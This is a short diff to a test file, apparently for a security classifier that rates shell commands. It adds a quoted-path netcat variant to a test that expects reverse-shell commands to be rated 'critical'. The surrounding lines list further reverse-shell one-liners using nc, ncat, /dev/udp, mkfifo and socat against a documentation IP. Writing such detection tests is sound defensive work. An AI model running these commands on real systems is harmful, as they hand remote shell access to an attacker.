@@ -19,6 +19,7 @@ test("a shell wired to a socket is critical", () => {
   });
   expect(severity("exec 5<>/dev/udp/192.0.2.1/1234")).toBe("critical");
   expect(severity("nc -e /bin/sh 192.0.2.1 1234")).toBe("critical");
+  expect(severity("nc -e '/bin/sh' 192.0.2.1 1234")).toBe("critical");
   expect(severity("ncat 192.0.2.1 1234 -c /bin/bash")).toBe("critical");
   expect(severity("mkfifo /tmp/f; cat /tmp/f | /bin/sh -i")).toBe("critical");
   expect(severity("socat TCP:192.0.2.1:1234 EXEC:true")).toBe("critical");
